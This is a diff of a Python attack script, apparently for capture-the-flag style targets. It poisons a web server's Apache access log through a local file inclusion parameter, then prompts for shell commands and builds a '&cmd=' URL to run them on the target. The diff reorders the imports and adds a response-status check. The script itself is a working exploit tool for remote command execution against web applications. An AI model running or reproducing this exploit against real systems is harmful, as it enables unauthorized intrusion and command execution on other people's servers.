@@ -1,7 +1,4 @@
 #!/usr/bin/python3
-import requests
-import urllib.parse
-
 print("                                                       /%")                   
 print("                                                     *&&@@&#")                  
 print("                                                    @@@@@@@@@&")                
@@ -27,7 +24,10 @@ print("              %%@&@&&@%(                                     @@%.")
 print("                     ,                                     &@&,")               
 print("                                                             %&") 
 print("	                 					    ")
-                                                               
+
+import requests
+import urllib.parse       
+
 url = input('[+] Enter the full url with the log file - i.e. http://10.10.10.10/site/index.php?page=/xampp/apache/logs/access.log\n URL: ')
 print(url)
 
@@ -39,6 +39,9 @@ headers = {
 print("[+] Poisoning...")
 response = requests.get(url, headers=headers)
 
+if response.status_code != 200:
+    print("[-] Response did not equal 200. Quitting...")
+    exit()
 
 print(response)
 print("[+] Log file poisoned!")
@@ -51,5 +54,7 @@ cmd=input("Enter a command:")
 print(f" You entered: {cmd}")
 commandPath=urllib.parse.quote(cmd)
 fullcmd=f"&cmd={commandPath}"
+
+
 print("[+] Try the path below to get the output output of your command. It is best to view in source-code:\n")
 print(url+fullcmd)
